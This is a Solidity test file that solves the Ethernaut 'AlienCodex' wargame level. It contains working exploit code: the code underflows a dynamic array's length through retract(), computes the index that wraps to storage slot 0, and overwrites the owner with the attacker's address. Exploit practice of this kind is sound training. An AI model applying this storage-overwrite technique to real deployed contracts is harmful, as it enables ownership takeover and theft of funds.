pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";


contract AlienCodexTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testAlienCodexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/AlienCodex/AlienCodex.json"));
        address alienCodex;

        // level needs to be deployed this way as it only works with 0.5.0 solidity version
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        vm.startPrank(tx.origin);


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Make contract first to set contact to true and pass the modifier checks of other functions
        alienCodex.call(abi.encodeWithSignature("make_contact()"));

        // all of contract storage is a 32 bytes key to 32 bytes value mapping
        // first make codex expand its size to cover all of this storage
        // by calling retract making it overflow
        alienCodex.call(abi.encodeWithSignature("retract()"));


        // Compute codex index corresponding to slot 0
        uint codexIndexForSlotZero = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;

        // address left padded with 0 to total 32 bytes
        bytes32 leftPaddedAddress = bytes32(abi.encode(tx.origin));

        // must be uint256 in function signature not uint
        // call revise with codex index and content which will set you as the owner
        alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", codexIndexForSlotZero, leftPaddedAddress));


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        (bool success, bytes memory data) = alienCodex.call(abi.encodeWithSignature("owner()"));

        // data is of type bytes32 so the address is padded, byte manipulation to get address
        address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));

        vm.stopPrank();
        assertEq(refinedData, tx.origin);
    }
}